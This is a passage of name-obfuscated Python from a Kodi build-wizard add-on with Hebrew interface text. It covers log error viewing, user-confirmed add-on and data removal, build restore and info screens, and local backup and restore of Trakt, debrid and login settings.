			OOO000OOO0OO0O000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O00O0O0000O0O0O0O .replace (LOG ,""),errorChecking (O00O0O0000O0O0O0O ,True ,True )),"View %s: %s error(s)"%(OOOO000OOOOO00O00 .replace (LOG ,""),errorChecking (OOOO000OOOOO00O00 ,True ,True ))])#line:4101
			if OOO000OOO0OO0O000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4102
		elif O00O0O0000O0O0O0O ==False and OOOO000OOOOO00O00 ==False :#line:4103
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4104
			return #line:4105
		elif not O00O0O0000O0O0O0O ==False :OOO000OOO0OO0O000 =0 #line:4106
		elif not OOOO000OOOOO00O00 ==False :OOO000OOO0OO0O000 =1 #line:4107
		log =O00O0O0000O0O0O0O if OOO000OOO0OO0O000 ==0 else OOOO000OOOOO00O00 #line:4108
	if log ==False :#line:4109
		if count ==None :#line:4110
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4111
			return False #line:4112
		else :#line:4113
			return 0 #line:4114
	else :#line:4115
		if os .path .exists (log ):#line:4116
			O0OOO0O0O0000OOO0 =open (log ,mode ='r');OO0O00O000O00O0OO =O0OOO0O0O0000OOO0 .read ().replace ('\n','').replace ('\r','');O0OOO0O0O0000OOO0 .close ()#line:4117
			OOOO00O00O000000O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO0O00O000O00O0OO )#line:4118
			if not count ==None :#line:4119
				if all ==None :#line:4120
					O000O0OO0OO00OO00 =0 #line:4121
					for O00O0O00O0OO0000O in OOOO00O00O000000O :#line:4122
						if ADDON_ID in O00O0O00O0OO0000O :O000O0OO0OO00OO00 +=1 #line:4123
					return O000O0OO0OO00OO00 #line:4124
				else :return len (OOOO00O00O000000O )#line:4125
			if len (OOOO00O00O000000O )>0 :#line:4126
				O000O0OO0OO00OO00 =0 ;OOO0O000OO0OO00O0 =""#line:4127
				for O00O0O00O0OO0000O in OOOO00O00O000000O :#line:4128
					if all ==None and not ADDON_ID in O00O0O00O0OO0000O :continue #line:4129
					else :#line:4130
						O000O0OO0OO00OO00 +=1 #line:4131
						OOO0O000OO0OO00O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O000O0OO0OO00OO00 ,O00O0O00O0OO0000O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4132
				if O000O0OO0OO00OO00 >0 :#line:4133
					wiz .TextBox (ADDONTITLE ,OOO0O000OO0OO00O0 )#line:4134
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4135
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4136
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4137
ACTION_PREVIOUS_MENU =10 #line:4139
ACTION_NAV_BACK =92 #line:4140
ACTION_MOVE_LEFT =1 #line:4141
ACTION_MOVE_RIGHT =2 #line:4142
ACTION_MOVE_UP =3 #line:4143
ACTION_MOVE_DOWN =4 #line:4144
ACTION_MOUSE_WHEEL_UP =104 #line:4145
ACTION_MOUSE_WHEEL_DOWN =105 #line:4146
ACTION_MOVE_MOUSE =107 #line:4147
ACTION_SELECT_ITEM =7 #line:4148
ACTION_BACKSPACE =110 #line:4149
ACTION_MOUSE_LEFT_CLICK =100 #line:4150
ACTION_MOUSE_LONG_CLICK =108 #line:4151
def LogViewer (default =None ):#line:4153
	class O00000OO00000OO00 (xbmcgui .WindowXMLDialog ):#line:4154
		def __init__ (O00OO0O0O00000OOO ,*OOOO00OOO0OO00OO0 ,**OOOO0O0O00O0O0O0O ):#line:4155
			O00OO0O0O00000OOO .default =OOOO0O0O00O0O0O0O ['default']#line:4156
		def onInit (OOOO0OO00O0O0OO0O ):#line:4158
			OOOO0OO00O0O0OO0O .title =101 #line:4159
			OOOO0OO00O0O0OO0O .msg =102 #line:4160
			OOOO0OO00O0O0OO0O .scrollbar =103 #line:4161
			OOOO0OO00O0O0OO0O .upload =201 #line:4162
			OOOO0OO00O0O0OO0O .kodi =202 #line:4163
			OOOO0OO00O0O0OO0O .kodiold =203 #line:4164
			OOOO0OO00O0O0OO0O .wizard =204 #line:4165
			OOOO0OO00O0O0OO0O .okbutton =205 #line:4166
			O0O000OOOO00OOOO0 =open (OOOO0OO00O0O0OO0O .default ,'r')#line:4167
			OOOO0OO00O0O0OO0O .logmsg =O0O000OOOO00OOOO0 .read ()#line:4168
			O0O000OOOO00OOOO0 .close ()#line:4169
			OOOO0OO00O0O0OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO00O0O0OO0O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4170
			OOOO0OO00O0O0OO0O .showdialog ()#line:4171
		def showdialog (OO000OOO0OO0OOO00 ):#line:4173
			OO000OOO0OO0OOO00 .getControl (OO000OOO0OO0OOO00 .title ).setLabel (OO000OOO0OO0OOO00 .titlemsg )#line:4174
			OO000OOO0OO0OOO00 .getControl (OO000OOO0OO0OOO00 .msg ).setText (wiz .highlightText (OO000OOO0OO0OOO00 .logmsg ))#line:4175
			OO000OOO0OO0OOO00 .setFocusId (OO000OOO0OO0OOO00 .scrollbar )#line:4176
		def onClick (OOO0O0OO00O00O00O ,O00OO000O0O0O00O0 ):#line:4178
			if O00OO000O0O0O00O0 ==OOO0O0OO00O00O00O .okbutton :OOO0O0OO00O00O00O .close ()#line:4179
			elif O00OO000O0O0O00O0 ==OOO0O0OO00O00O00O .upload :OOO0O0OO00O00O00O .close ();uploadLog .Main ()#line:4180
			elif O00OO000O0O0O00O0 ==OOO0O0OO00O00O00O .kodi :#line:4181
				O000000OO000OO0OO =wiz .Grab_Log (False )#line:4182
				OOOO0OO00O0OOO0OO =wiz .Grab_Log (True )#line:4183
				if O000000OO000OO0OO ==False :#line:4184
					OOO0O0OO00O00O00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4185
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .msg ).setText ("Log File Does Not Exists!")#line:4186
				else :#line:4187
					OOO0O0OO00O00O00O .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO00O0OOO0OO .replace (LOG ,''))#line:4188
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .title ).setLabel (OOO0O0OO00O00O00O .titlemsg )#line:4189
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .msg ).setText (wiz .highlightText (O000000OO000OO0OO ))#line:4190
					OOO0O0OO00O00O00O .setFocusId (OOO0O0OO00O00O00O .scrollbar )#line:4191
			elif O00OO000O0O0O00O0 ==OOO0O0OO00O00O00O .kodiold :#line:4192
				O000000OO000OO0OO =wiz .Grab_Log (False ,True )#line:4193
				OOOO0OO00O0OOO0OO =wiz .Grab_Log (True ,True )#line:4194
				if O000000OO000OO0OO ==False :#line:4195
					OOO0O0OO00O00O00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4196
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .msg ).setText ("Log File Does Not Exists!")#line:4197
				else :#line:4198
					OOO0O0OO00O00O00O .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO00O0OOO0OO .replace (LOG ,''))#line:4199
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .title ).setLabel (OOO0O0OO00O00O00O .titlemsg )#line:4200
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .msg ).setText (wiz .highlightText (O000000OO000OO0OO ))#line:4201
					OOO0O0OO00O00O00O .setFocusId (OOO0O0OO00O00O00O .scrollbar )#line:4202
			elif O00OO000O0O0O00O0 ==OOO0O0OO00O00O00O .wizard :#line:4203
				O000000OO000OO0OO =wiz .Grab_Log (False ,False ,True )#line:4204
				OOOO0OO00O0OOO0OO =wiz .Grab_Log (True ,False ,True )#line:4205
				if O000000OO000OO0OO ==False :#line:4206
					OOO0O0OO00O00O00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4207
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .msg ).setText ("Log File Does Not Exists!")#line:4208
				else :#line:4209
					OOO0O0OO00O00O00O .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO00O0OOO0OO .replace (ADDONDATA ,''))#line:4210
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .title ).setLabel (OOO0O0OO00O00O00O .titlemsg )#line:4211
					OOO0O0OO00O00O00O .getControl (OOO0O0OO00O00O00O .msg ).setText (wiz .highlightText (O000000OO000OO0OO ))#line:4212
					OOO0O0OO00O00O00O .setFocusId (OOO0O0OO00O00O00O .scrollbar )#line:4213
		def onAction (O0OO0000OOOOOO0O0 ,O0OO0OOO0OO00O0OO ):#line:4215
			if O0OO0OOO0OO00O0OO ==ACTION_PREVIOUS_MENU :O0OO0000OOOOOO0O0 .close ()#line:4216
			elif O0OO0OOO0OO00O0OO ==ACTION_NAV_BACK :O0OO0000OOOOOO0O0 .close ()#line:4217
	if default ==None :default =wiz .Grab_Log (True )#line:4218
	O00O0O0OOO0OOOO00 =O00000OO00000OO00 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4219
	O00O0O0OOO0OOOO00 .doModal ()#line:4220
	del O00O0O0OOO0OOOO00 #line:4221
def removeAddon (O00OOOO00OOOO0O0O ,OOOOO0OOOOOOOOO00 ,over =False ):#line:4223
	if not over ==False :#line:4224
		OO0OO0O0OO000O0OO =1 #line:4225
	else :#line:4226
		OO0OO0O0OO000O0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO0OOOOOOOOO00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00OOOO00OOOO0O0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4227
	if OO0OO0O0OO000O0OO ==1 :#line:4228
		OOOO0000O0O0O0O00 =os .path .join (ADDONS ,O00OOOO00OOOO0O0O )#line:4229
		wiz .log ("Removing Addon %s"%O00OOOO00OOOO0O0O )#line:4230
		wiz .cleanHouse (OOOO0000O0O0O0O00 )#line:4231
		xbmc .sleep (1000 )#line:4232
		try :shutil .rmtree (OOOO0000O0O0O0O00 )#line:4233
		except Exception as OOO0OO0O0O000OO0O :wiz .log ("Error removing %s"%O00OOOO00OOOO0O0O ,xbmc .LOGNOTICE )#line:4234
		removeAddonData (O00OOOO00OOOO0O0O ,OOOOO0OOOOOOOOO00 ,over )#line:4235
	if over ==False :#line:4236
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOOOO0OOOOOOOOO00 ))#line:4237
def removeAddonData (O00O000000O0OOOOO ,name =None ,over =False ):#line:4239
	if O00O000000O0OOOOO =='all':#line:4240
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4241
			wiz .cleanHouse (ADDOND )#line:4242
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4243
	elif O00O000000O0OOOOO =='uninstalled':#line:4244
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4245
			OO0OO0O0O0O00OOOO =0 #line:4246
			for OO00000000O0OO0O0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4247
				OOOOO00O00OO0O00O =OO00000000O0OO0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4248
				if OOOOO00O00OO0O00O in EXCLUDES :pass #line:4249
				elif os .path .exists (os .path .join (ADDONS ,OOOOO00O00OO0O00O )):pass #line:4250
				else :wiz .cleanHouse (OO00000000O0OO0O0 );OO0OO0O0O0O00OOOO +=1 ;wiz .log (OO00000000O0OO0O0 );shutil .rmtree (OO00000000O0OO0O0 )#line:4251
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO0O0O0O00OOOO ))#line:4252
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4253
	elif O00O000000O0OOOOO =='empty':#line:4254
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4255
			OO0OO0O0O0O00OOOO =wiz .emptyfolder (ADDOND )#line:4256
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO0O0O0O00OOOO ))#line:4257
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4258
	else :#line:4259
		OOO0OO00O000O00O0 =os .path .join (USERDATA ,'addon_data',O00O000000O0OOOOO )#line:4260
		if O00O000000O0OOOOO in EXCLUDES :#line:4261
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4262
		elif os .path .exists (OOO0OO00O000O00O0 ):#line:4263
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O000000O0OOOOO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4264
				wiz .cleanHouse (OOO0OO00O000O00O0 )#line:4265
				try :#line:4266
					shutil .rmtree (OOO0OO00O000O00O0 )#line:4267
				except :#line:4268
					wiz .log ("Error deleting: %s"%OOO0OO00O000O00O0 )#line:4269
			else :#line:4270
				wiz .log ('Addon data for %s was not removed'%O00O000000O0OOOOO )#line:4271
	wiz .refresh ()#line:4272
def restoreit (O0OOO0O00OO0OO0OO ):#line:4274
	if O0OOO0O00OO0OO0OO =='build':#line:4275
		O0OOOO000O00O0O00 =freshStart ('restore')#line:4276
		if O0OOOO000O00O0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4277
	if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:4278
		wiz .skinToDefault ()#line:4279
	wiz .restoreLocal (O0OOO0O00OO0OO0OO )#line:4280
def restoreextit (O0O0000O00OOO000O ):#line:4282
	if O0O0000O00OOO000O =='build':#line:4283
		OO00O0O0O00000OOO =freshStart ('restore')#line:4284
		if OO00O0O0O00000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4285
	wiz .restoreExternal (O0O0000O00OOO000O )#line:4286
def buildInfo (OO000000O00000000 ):#line:4288
	if wiz .workingURL (SPEEDFILE )==True :#line:4289
		if wiz .checkBuild (OO000000O00000000 ,'url'):#line:4290
			OO000000O00000000 ,OOOO000OOOO0OO000 ,O0000OO0O0OO00OO0 ,O000O0OOO0O00O0OO ,O0O000000O0O0OOO0 ,OOO0O00O0OO00OO0O ,OO00O0000O000000O ,OO0OO0000OOO00OO0 ,OOOO0000O00OO0000 ,OO00OO0O00O00OO00 ,OOOO0OO0O0O00OO0O =wiz .checkBuild (OO000000O00000000 ,'all')#line:4291
			OO00OO0O00O00OO00 ='Yes'if OO00OO0O00O00OO00 .lower ()=='yes'else 'No'#line:4292
			O000O0OO0O0OOO00O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000000O00000000 )#line:4293
			O000O0OO0O0OOO00O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO000OOOO0OO000 )#line:4294
			if not OOO0O00O0OO00OO0O =="http://":#line:4295
				O0O00OO0O00O00O00 =wiz .themeCount (OO000000O00000000 ,False )#line:4296
				O000O0OO0O0OOO00O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0O00OO0O00O00O00 ))#line:4297
			O000O0OO0O0OOO00O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O000000O0O0OOO0 )#line:4298
			O000O0OO0O0OOO00O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00OO0O00O00OO00 )#line:4299
			O000O0OO0O0OOO00O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO0OO0O0O00OO0O )#line:4300
			wiz .TextBox (ADDONTITLE ,O000O0OO0O0OOO00O )#line:4301
		else :wiz .log ("Invalid Build Name!")#line:4302
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4303
def buildVideo (OOO0OO00O00OO000O ):#line:4305
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4306
	if wiz .workingURL (SPEEDFILE )==True :#line:4307
		OOOO00OO0OO0O00O0 =wiz .checkBuild (OOO0OO00O00OO000O ,'preview')#line:4308
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOO0OO00O00OO000O )#line:4309
		if OOOO00OO0OO0O00O0 and not OOOO00OO0OO0O00O0 =='http://':playVideo (OOOO00OO0OO0O00O0 )#line:4310
		else :wiz .log ("[%s]Unable to find url for video preview"%OOO0OO00O00OO000O )#line:4311
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4312
def dependsList (O0O00OOO0OOOO000O ):#line:4314
	OO0OOOO00OO0OOO0O =os .path .join (ADDONS ,O0O00OOO0OOOO000O ,'addon.xml')#line:4315
	if os .path .exists (OO0OOOO00OO0OOO0O ):#line:4316
		O00OOOO0O00000O0O =open (OO0OOOO00OO0OOO0O ,mode ='r');OO0OOO00000OO0OOO =O00OOOO0O00000O0O .read ();O00OOOO0O00000O0O .close ();#line:4317
		O000OOO0000O000OO =wiz .parseDOM (OO0OOO00000OO0OOO ,'import',ret ='addon')#line:4318
		OOO0OO0OO0O00000O =[]#line:4319
		for OOOOOO0OOO0OOO0O0 in O000OOO0000O000OO :#line:4320
			if not 'xbmc.python'in OOOOOO0OOO0OOO0O0 :#line:4321
				OOO0OO0OO0O00000O .append (OOOOOO0OOO0OOO0O0 )#line:4322
		return OOO0OO0OO0O00000O #line:4323
	return []#line:4324
def manageSaveData (O0O0O00OO000OO0O0 ):#line:4326
	if O0O0O00OO000OO0O0 =='import':#line:4327
		O00OO0O0O00000O0O =os .path .join (ADDONDATA ,'temp')#line:4328
		if not os .path .exists (O00OO0O0O00000O0O ):os .makedirs (O00OO0O0O00000O0O )#line:4329
		O0O0OO00OOOOO0000 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4330
		if not O0O0OO00OOOOO0000 .endswith ('.zip'):#line:4331
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4332
			return #line:4333
		O0OO00OOO0000O000 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4334
		O00O00O0O00OO0O00 =xbmcvfs .copy (O0O0OO00OOOOO0000 ,O0OO00OOO0000O000 )#line:4335
		wiz .log ("%s"%str (O00O00O0O00OO0O00 ))#line:4336
		extract .all (xbmc .translatePath (O0OO00OOO0000O000 ),O00OO0O0O00000O0O )#line:4337
		OO0000OOO0O00O000 =os .path .join (O00OO0O0O00000O0O ,'trakt')#line:4338
		OOO0OOOO0O00O0OO0 =os .path .join (O00OO0O0O00000O0O ,'login')#line:4339
		O0OO00OO0O0O0OOO0 =os .path .join (O00OO0O0O00000O0O ,'debrid')#line:4340
		OOO000O0O000OO0O0 =0 #line:4341
		if os .path .exists (OO0000OOO0O00O000 ):#line:4342
			OOO000O0O000OO0O0 +=1 #line:4343
			OOOOO00OO0OO0O00O =os .listdir (OO0000OOO0O00O000 )#line:4344
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4345
			for OOO0OOO0OOOOO000O in OOOOO00OO0OO0O00O :#line:4346
				OOO0O0000O0000O00 =os .path .join (traktit .TRAKTFOLD ,OOO0OOO0OOOOO000O )#line:4347
				O00OOO0000O00O0O0 =os .path .join (OO0000OOO0O00O000 ,OOO0OOO0OOOOO000O )#line:4348
				if os .path .exists (OOO0O0000O0000O00 ):#line:4349
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0OOO0OOOOO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4350
					else :os .remove (OOO0O0000O0000O00 )#line:4351
				shutil .copy (O00OOO0000O00O0O0 ,OOO0O0000O0000O00 )#line:4352
			traktit .importlist ('all')#line:4353
			traktit .traktIt ('restore','all')#line:4354
		if os .path .exists (OOO0OOOO0O00O0OO0 ):#line:4355
			OOO000O0O000OO0O0 +=1 #line:4356
			OOOOO00OO0OO0O00O =os .listdir (OOO0OOOO0O00O0OO0 )#line:4357
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4358
			for OOO0OOO0OOOOO000O in OOOOO00OO0OO0O00O :#line:4359
				OOO0O0000O0000O00 =os .path .join (loginit .LOGINFOLD ,OOO0OOO0OOOOO000O )#line:4360
				O00OOO0000O00O0O0 =os .path .join (OOO0OOOO0O00O0OO0 ,OOO0OOO0OOOOO000O )#line:4361
				if os .path .exists (OOO0O0000O0000O00 ):#line:4362
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0OOO0OOOOO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4363
					else :os .remove (OOO0O0000O0000O00 )#line:4364
				shutil .copy (O00OOO0000O00O0O0 ,OOO0O0000O0000O00 )#line:4365
			loginit .importlist ('all')#line:4366
			loginit .loginIt ('restore','all')#line:4367
		if os .path .exists (O0OO00OO0O0O0OOO0 ):#line:4368
			OOO000O0O000OO0O0 +=1 #line:4369
			OOOOO00OO0OO0O00O =os .listdir (O0OO00OO0O0O0OOO0 )#line:4370
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4371
			for OOO0OOO0OOOOO000O in OOOOO00OO0OO0O00O :#line:4372
				OOO0O0000O0000O00 =os .path .join (debridit .REALFOLD ,OOO0OOO0OOOOO000O )#line:4373
				O00OOO0000O00O0O0 =os .path .join (O0OO00OO0O0O0OOO0 ,OOO0OOO0OOOOO000O )#line:4374
				if os .path .exists (OOO0O0000O0000O00 ):#line:4375
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0OOO0OOOOO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4376
					else :os .remove (OOO0O0000O0000O00 )#line:4377
				shutil .copy (O00OOO0000O00O0O0 ,OOO0O0000O0000O00 )#line:4378
			debridit .importlist ('all')#line:4379
			debridit .debridIt ('restore','all')#line:4380
		wiz .cleanHouse (O00OO0O0O00000O0O )#line:4381
		wiz .removeFolder (O00OO0O0O00000O0O )#line:4382
		os .remove (O0OO00OOO0000O000 )#line:4383
		if OOO000O0O000OO0O0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4384
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4385
	elif O0O0O00OO000OO0O0 =='export':#line:4386
		OOOOOO00O0OO0OOOO =xbmc .translatePath (MYBUILDS )#line:4387
		OOO0OO00OO0O00O0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4388
		traktit .traktIt ('update','all')#line:4389
		loginit .loginIt ('update','all')#line:4390
		debridit .debridIt ('update','all')#line:4391
		O0O0OO00OOOOO0000 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4392
		O0O0OO00OOOOO0000 =xbmc .translatePath (O0O0OO00OOOOO0000 )#line:4393
		OOOOOOO0000O0OOOO =os .path .join (OOOOOO00O0OO0OOOO ,'SaveData.zip')#line:4394
		O00OO00O0OOO000O0 =zipfile .ZipFile (OOOOOOO0000O0OOOO ,mode ='w')#line:4395
		for OOO0OOO0000OOOO00 in OOO0OO00OO0O00O0O :#line:4396
			if os .path .exists (OOO0OOO0000OOOO00 ):#line:4397
				OOOOO00OO0OO0O00O =os .listdir (OOO0OOO0000OOOO00 )#line:4398
				for OOO00OO00OOO000O0 in OOOOO00OO0OO0O00O :#line:4399
					O00OO00O0OOO000O0 .write (os .path .join (OOO0OOO0000OOOO00 ,OOO00OO00OOO000O0 ),os .path .join (OOO0OOO0000OOOO00 ,OOO00OO00OOO000O0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4400
		O00OO00O0OOO000O0 .close ()#line:4401
		if O0O0OO00OOOOO0000 ==OOOOOO00O0OO0OOOO :#line:4402
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOO0000O0OOOO ))#line:4403
		else :#line:4404
			try :#line:4405
				xbmcvfs .copy (OOOOOOO0000O0OOOO ,os .path .join (O0O0OO00OOOOO0000 ,'SaveData.zip'))#line:4406
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0O0OO00OOOOO0000 ,'SaveData.zip')))#line:4407
			except :#line:4408
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOO0000O0OOOO ))#line:4409
def freshStart (install =None ,over =False ):#line:4414
	if USERNAME =='':#line:4415
		ADDON .openSettings ()#line:4416
		sys .exit ()#line:4417
	OOO0OOO0000000OO0 =u_list (SPEEDFILE )#line:4418
	(OOO0OOO0000000OO0 )#line:4419
	OOO0OOO00000000OO =(wiz .workingURL (OOO0OOO0000000OO0 ))#line:4420
	(OOO0OOO00000000OO )#line:4421
	if KEEPTRAKT =='true':#line:4422
		traktit .autoUpdate ('all')#line:4423
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4424
	if KEEPREAL =='true':#line:4425
		debridit .autoUpdate ('all')#line:4426
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4427
	if KEEPLOGIN =='true':#line:4428
		loginit .autoUpdate ('all')#line:4429
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4430
	if over ==True :OO0O00O0OOOOO00OO =1 #line:4431
	elif install =='restore':OO0O00O0OOOOO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4432
